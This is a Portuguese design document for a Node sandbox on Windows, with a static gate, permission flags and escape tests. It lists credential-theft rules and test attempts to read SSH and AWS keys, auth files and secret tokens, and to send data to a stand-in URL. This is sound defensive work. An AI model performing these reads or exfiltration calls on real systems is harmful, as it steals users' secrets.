# Fase 2 — Sandbox Windows e Governança

> **Escopo:** as três camadas de isolamento do SelfEvoPI e a política de processos.
> **Implementado:** `core/sandbox/static-gate.mjs` (camada 1), `core/sandbox/run-sandboxed.mjs` (camada 2) e `core/sandbox/escape.test.mjs` (prova de bloqueio). Camada 3 e keep-alive: veredito na §4.

## 1. Por que três camadas

Nenhum mecanismo isolado cobre os três modos de falha. Cada um resolve um problema diferente:

| Camada | Mecanismo | O que impede | O que não impede |
|:---|:---|:---|:---|
| **1. Prevenção** | Gate estático (AST/regex) | Que o código perigoso chegue a rodar | Código que engana a análise |
| **2. Contenção** | Node `--permission` + preload de rede | Que o processo leia/escreva fora do worktree e que fale com a rede | Código malicioso — é cinto, não cofre |
| **3. Encerramento** | Windows Job Objects | Que sobrem processos órfãos e arquivos travados | Que um processo escape do job |

A ordem importa: o gate é barato e determinístico, então roda primeiro. O Permission Model é a garantia em tempo de execução. O Job Object é a limpeza.

## 2. Camada 1 — Gate estático

`core/sandbox/static-gate.mjs`. Analisa o código **antes** de executar e devolve:

```json
{
  "file": "artefato.mjs",
  "decision": "block",
  "blockingRules": ["registry-exe"],
  "warningRules": ["child-process"],
  "violations": [
    { "rule": "registry-exe", "severity": "block", "line": 12, "excerpt": "execFileSync(\"reg.exe\", ...)" }
  ]
}
```

### Regras

| Regra | Alvo |
|:---|:---|
| `ssh-access` | leitura de chaves SSH |
| `credential-store` | acesso a arquivos de credencial conhecidos |
| `userprofile-config` | leitura da configuração do usuário |
| `registry-exe` | `reg.exe` e consulta ao registro |
| `recursive-force-delete` | deleção recursiva de árvore |
| `child-process` | `child_process` e execução de comando externo |
| `network-access` | `fetch`, `http.request` e afins |
| `dynamic-eval` | `eval` e `Function` dinâmico |
| `secret-env-read` | leitura de variáveis de ambiente sensíveis |
| `embedded-secret` | segredo escrito no próprio código |
| `pi-config-access` | acesso à configuração do PI |
| `outside-workspace-path` | caminho fora do worktree |
| `process-env-read` | leitura genérica de `process.env` |

Duas decisões de projeto que evitam falso positivo:

- **Comentários e literais são mascarados** antes da análise. Um comentário que cita `reg.exe` não reprova; um `fetch(` dentro de string de exemplo também não. Isso foi a correção mais custosa do gate.
- **Caminhos são classificados**, não só comparados por texto: absoluto, relativo ao worktree ou fora dele.

### Classificação por regra

| Bloqueiam | Apenas avisam |
|:---|:---|
| `ssh-access` | `recursive-force-delete` **dentro** do workspace |
| `credential-store` | `pi-config-access` |
| `userprofile-config` | `outside-workspace-path` |
| `registry-exe` | `process-env-read` |
| `recursive-force-delete` **fora** do workspace | `file-skipped` |
| `child-process` | |
| `network-access` | |
| `dynamic-eval` | |
| `secret-env-read` | |
| `embedded-secret` | |

### Limitações (explícitas)

O gate é **análise estática**. Ele não executa o código e não prova que o artefato é seguro. Um artefato pode escapar da análise (ofuscação, código gerado em tempo de execução, dependência que só baixa depois). Por isso ele é a camada 1, nunca a única.

## 3. Camada 2 — Node Permission Model

Implementada em `core/sandbox/run-sandboxed.mjs`. Testes: `core/sandbox/run-sandboxed.test.mjs` (15 casos).

```powershell
node --test core/sandbox/run-sandboxed.test.mjs
```

`runSandboxed({ script, args, workdir, timeoutMs, allowRead, allowWrite })` monta os flags — e quem chama não os escolhe:

| Flag | Efeito |
|:---|:---|
| `--permission` | liga o modelo |
| `--allow-fs-read=<workdir>` | leitura restrita ao workdir (mais os extras de `allowRead`) |
| `--allow-fs-write=<workdir>` | escrita, **só com `allowWrite`** |
| `--import data:text/javascript;base64,…` | injeta o preload de rede |
| `--allow-net` | **nunca** |
| `--allow-child-process` | **nunca** |

Devolve `{ ok, exitCode, stdout, stderr, durationMs, timedOut, pid, signal, truncated, blocked, gate }`. Saída limitada a 64 KB por fluxo, e o filho recebe ambiente mínimo (allowlist) em vez do `process.env` do harness — token não vaza para o código gerado.

### Achado: nesta versão o Permission Model não barra rede

Medido em Node **24.13.0** no Windows, com `--permission --allow-fs-read=<workdir>`:

| Tentativa do script | `process.permission.has("net")` | Resultado observado |
|:---|:---|:---|
| `fetch("https://example.com")` | `false` | **200 OK** |
| `https.get(...)` | `false` | **200 OK** |
| `net.connect(443, "example.com")` | `false` | **conectou** |
| `fs.readFileSync` fora do workdir | — | `ERR_ACCESS_DENIED` (FileSystemRead) |
| `child_process.execSync` | — | `ERR_ACCESS_DENIED` (ChildProcess) |

`has("net")` responde `false` e a chamada passa do mesmo jeito. O modelo cobre `fs` e `child_process`; rede, não.

Por isso o runner injeta um preload (`NET_BLOCK_PRELOAD`) que troca `fetch`, `http.request/get`, `https.request/get`, `net.connect/createConnection`, `tls.connect`, `dgram.createSocket` e `net.Socket.prototype.connect` por um `ERR_ACCESS_DENIED` — o mesmo código que o Permission Model usa, para que o erro seja indistinguível do ponto de vista do script.

Sem o preload, `--permission` sozinho reprova o teste de rede. Com ele, as duas metades se cobrem: o runtime fecha `fs` e `child_process`, o preload fecha a rede.

### Tempo esgotado: matar a árvore

Ao estourar `timeoutMs`, o runner chama `taskkill /PID <pid> /T /F`. O `/T` alcança netos e processos destacados, que um `child.kill()` deixaria vivos. Fora do Windows, SIGKILL no grupo de processos.

### Pré-checagem

Por padrão o runner passa o script pelo gate antes de spawnar. Com `decision: "block"` devolve `blocked: true` e `pid: null` — nenhum processo chega a existir. `precheck: false` existe para isolar a camada 2 em teste; em produção fica ligado.

### O que ela não é

Contenção, não cofre. O modelo é um cinto de segurança para código confiável, e código malicioso pode contorná-lo — o próprio manual diz isso. Ela precisa vir acompanhada da camada 1 (que reprova antes) e do token de baixa integridade (que ainda não existe). O preload de rede, em particular, é uma reposição de função: um script determinado pode importar o módulo original antes do patch ou usar um caminho que ninguém cobriu.

## 4. Camada 3 — Windows Job Objects

`CreateJobObject` + `AssignProcessToJobObject` com `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`.

- Processos filhos **herdam o job por padrão** — não é preciso laçar cada um.
- `TerminateJobObject` encerra a árvore inteira de uma vez.
- Evita o problema clássico do Windows: processo filho preso mantendo arquivo aberto e travando o NTFS.

### Veredito: Job Objects não implementado (e por quê)

Node não tem binding nativo para Job Objects. Existe um caminho **sem dependência npm** — PowerShell com `Add-Type` e P/Invoke para `kernel32!CreateJobObject` — e ele foi medido nesta máquina:

| Etapa | Custo medido |
|:---|:---|
| `Add-Type` + `CreateJobObject` (dentro do script) | **405 ms** |
| processo `powershell.exe` inteiro, ida e volta | **774 ms** |

Três motivos para não pagar esse custo agora:

1. **Ganho alcançável: zero.** O `child_process` é negado pelo Permission Model (§6 prova: `spawnSync` morre com `ERR_ACCESS_DENIED`). Sem processo filho, a árvore tem profundidade 1 — e `taskkill /PID <pid> /T /F` já encerra profundidade 1 de forma determinística. Job Object só ganha de `taskkill /T` quando existe **neto órfão** (pai morto no meio), e neto é justamente o que não existe aqui.
2. **Custo por execução.** 774 ms a mais em toda chamada ao sandbox, contra os ~150 ms que um artefato simples custa hoje. A suíte inteira levaria ~6x mais tempo, e o loop evolutivo paga isso em cada artefato.
3. **Mudança de arquitetura.** Para o job conter o processo, o `node` teria de nascer **filho do helper** PowerShell — ou seja, a raiz da árvore deixa de ser o runner, e stdout/stderr/exit code passam por um terceiro processo. É mais uma superfície de falha para fechar um buraco que não existe.

**O que mudaria a decisão:** liberar `child_process` para alguma classe de artefato, adotar keep-alive (que por definição deixa netos vivos), ou aparecer um caso real de neto órfão. Qualquer um desses, e o Job Object passa a ser a única coisa que alcança o processo — aí os 774 ms se pagam.

**Enquanto isso:** o encerramento é `taskkill /PID <pid> /T /F`, chamado no timeout e disponível para o supervisor encerrar sob demanda.

### Política de keep-alive por tarefa

Este é o ponto onde a maioria dos harnesses erra. Encerrar a árvore inteira **sempre** parece seguro, mas quebra tarefas legítimas:

> Medição do Harness Leaderboard (nov/2026): o DeepSeek Harness encerra todo processo de background ao terminar. Em três tarefas do Terminal-Bench que exigem um servidor vivo após a saída do agente, passou **2 de 36** — custo de 1,5 a 1,7 ponto por avaliação, maior que sua vantagem real sobre o líder.

A política do SelfEvoPI é **por tarefa**:

| Modo | Quando | Comportamento |
|:---|:---|:---|
| `kill-tree` | padrão | `taskkill /PID <pid> /T /F` encerra a árvore ao fim da tarefa |
| `keep-alive` | tarefa que deixa serviço no ar | o processo sobrevive; um coletor decide quando encerrar (não implementado — ver abaixo) |

A decisão pertence a quem declara a tarefa, não ao sandbox. O sandbox executa a política; não a inventa.

### Veredito: keep-alive não implementado (e por quê)

O ganho é real e está medido na pesquisa (`docs/research/inspiracoes.md` §2.17). Mesmo assim, `runSandboxed` **não** ganha uma opção `keepAlive`. Três motivos, em ordem de peso:

1. **Quebra o contrato.** Hoje o runner chama `runSandboxed(...)` e recebe `{ ok, exitCode, stdout, stderr, durationMs }` quando o processo **termina**. Um processo mantido vivo não termina: seria preciso devolver o `pid` antes do fim, perder `stdout/stderr` e transformar a função em outra coisa — um supervisor, não um executor.
2. **É o oposto do que a peça existe para fazer.** O runner é a limpeza. Uma opção que desliga a limpeza por padrão seguro é um vazamento esperando para acontecer; o padrão continua sendo `taskkill /T /F` no timeout e nada sobra.
3. **O mecanismo já existe, separado.** `runSandboxed` devolve `pid`, e `taskkill /PID <pid> /T /F` encerra a árvore sob demanda. Quem adota o processo entre tarefas é o supervisor, que tem o ciclo de vida, a fila e o grader.

**O que seria preciso para implementar:** um `startSandboxed()` que devolva `{ pid, stdout, stderr }` com um stream contínuo, um `killSandboxed(pid)` no mesmo mecanismo, e um dono do processo no coordenador — com o `keep-alive` declarado na tarefa e auditado no ledger. Isso é uma peça nova, não uma flag.

## 5. Como as camadas se combinam

```
artefato gerado
   │
   ├─ 1. gate estático ──────► block? descarta, não gasta execução
   │                            warn? segue com registro
   ├─ 2. node --permission ──► fs restrito ao worktree, sem filho, preload fecha a rede
   │                            timeout ⇒ taskkill /T /F na árvore
   └─ 3. Job Object (spec) ──► kill-tree ou keep-alive, conforme a tarefa
```

Um artefato só é promovido se passar nas três. Falhar em qualquer uma devolve o artefato ao loop com o motivo, e o gatekeeper registra a regressão.

## 6. Prova de bloqueio — `core/sandbox/escape.test.mjs`

A suíte comum prova que o gate **classifica**. Este arquivo prova que o processo **não sai**. Cada caso é um artefato malicioso real, rodado duas vezes: com o gate ligado (caminho de produção) e com `precheck: false`, para isolar a camada 2 — se o runtime deixasse passar, o artefato passaria na segunda.

```powershell
node --test core/sandbox/escape.test.mjs    # 8 passam
```

| Tentativa | Camada que barrou | Evidência (stderr, com `precheck: false`) |
|:---|:---|:---|
| `fetch("https://example.invalid/collect?d=1")` | gate + runtime | `Error: SelfEvoPI sandbox: fetch bloqueado` |
| ler `C:/Windows/System32/drivers/etc/hosts` | **runtime** | `Access to this API has been restricted. Use --allow-fs-read` |
| escrever em `os.homedir()` | **runtime** | `Access to this API has been restricted. Use --allow-fs-write` |
| `spawnSync("node", ["-e", "…"])` | gate + runtime | `Access to this API has been restricted. Use --allow-child-process` |
| ler `~/.ssh/id_rsa` | gate + runtime | `Access to this API has been restricted. Use --allow-fs-read` |
| ler `~/.aws/credentials` | **runtime** | `Access to this API has been restricted. Use --allow-fs-read` |
| ler `~/.config/opencode/auth.json` | gate + runtime | `Access to this API has been restricted. Use --allow-fs-read` |
| ler `process.env.SELFEVOPI_FAKE_TOKEN` | gate + runtime | gate barra o nome; com `precheck: false` o filho imprime `TOKEN null` (ambiente mínimo) |

Onde está cada caso em `core/sandbox/escape.test.mjs`:

| Caso | Linha |
|:---|:---|
| rede (`fetch`) | 105 |
| disco externo — leitura | 135 |
| disco externo — escrita no home | 168 |
| subprocesso (`spawnSync`) | 201 |
| credenciais (`ssh`, `aws`, config do PI) | 229 (laço sobre `CASOS_DE_CREDENCIAL`) |
| ambiente (segredo do pai) | 283 |

Três linhas merecem leitura:

- **`.aws/credentials` só é barrado pelo runtime.** O gate não tem regra para `.aws` — é regra faltando, não decisão. Se um dia o Permission Model sair de cena, esse buraco abre.
- **O nome `SELFEVOPI_FAKE_TOKEN` é barrado duas vezes.** O gate recusa o nome (é leitura de segredo) e, com o gate desligado, o filho ainda não vê a variável: o runner passa uma allowlist de ambiente, não o process.env do harness. É a única linha em que as duas camadas agem por motivos diferentes.
- **Ler o hosts do Windows é aviso, não bloqueio, no gate.** O caminho externo é detectado e registrado; quem impede a leitura é a camada 2. É a divisão certa: o gate sabe que é suspeito, o runtime sabe se é possível.

O teste também verifica o que **não** aconteceu: o `fetch` não pode produzir `STATUS 200` no stdout, e o arquivo no home tem de continuar inexistente. Recusar a saída de erro é fácil; provar a **ausência do efeito** é o que fecha o caso.

Nenhum caso passou. Não há buraco aberto nesta rodada.

## 7. Estado

| Item | Estado |
|:---|:---|
| Gate estático + 13 regras | implementado, 44 testes |
| Classificação de caminho | implementado |
| Máscara de comentários/literais | implementado |
| Camada 2 (Permission Model + preload + taskkill) | implementado, 15 testes |
| Camada 2 — prova de bloqueio | implementado, 8 casos (`escape.test.mjs`) |
| Camada 3 (Job Objects) | **não implementado**, com motivo medido (§4) |
| Política keep-alive | **não implementado**, com motivo (§4) |

### Comandos

```powershell
node --test core/sandbox/static-gate.test.mjs      # 44 passam
node --test core/sandbox/run-sandboxed.test.mjs    # 15 passam
node --test core/sandbox/escape.test.mjs           # 8 passam (prova de bloqueio)
```

O teste de timeout mata a árvore e confirma no `after()` que nenhum pid sobreviveu; se sobrasse um, a suíte falha. O `escape.test.mjs` prova o efeito, não só a classificação: stdout sem `STATUS 200` e arquivo no home inexistente.

## 8. Decisão: `verify.mjs` é código do harness, não do artefato

O Forge (A5) gera três arquivos por artefato: `cli.mjs` (ou `SKILL.md`), `README.md` e **`verify.mjs`**. O `verify.mjs` executa os testes do pedido e, para isso, usa `spawnSync` — que o gate estático bloqueia como `child-process` (severidade `block`).

Sem uma regra, **todo artefato gerado seria barrado pelo próprio sandbox**.

### A decisão

**O `verify.mjs` roda FORA do sandbox. O artefato que ele invoca roda DENTRO.**

O sandbox existe para conter o **artefato**, não o **testador**. É a mesma separação entre o CI e o app: o runner de teste precisa de liberdades que o código sob teste não tem.

### Por que não abrir exceção no gate

A alternativa seria liberar `child-process` em arquivos chamados `verify.mjs`. Isso cria um buraco permanente: qualquer artefato poderia se renomear para escapar da regra. A separação de papéis não cria precedente.

### Trade-offs

| | Rodar fora (escolhido) | Exceção no gate |
|:---|:---|:---|
| Segurança | o testador roda livre, mas é código gerado e revisado | qualquer arquivo pode se disfarçar |
| Simplicidade | uma regra: testador fora, alvo dentro | exceção que o loop pode explorar |
| Risco residual | um `verify.mjs` malicioso roda livre | um artefato malicioso se disfarça de verify |

### Risco residual e mitigação

O `verify.mjs` é gerado a partir de `request.tests`, que vem de uma spec aprovada. Mesmo assim, ele passa pelo **gate estático antes de executar** (a regra `child-process` vira `warn` para esse arquivo específico) e roda com token restrito. Não é confiança cega — é confiança com registro.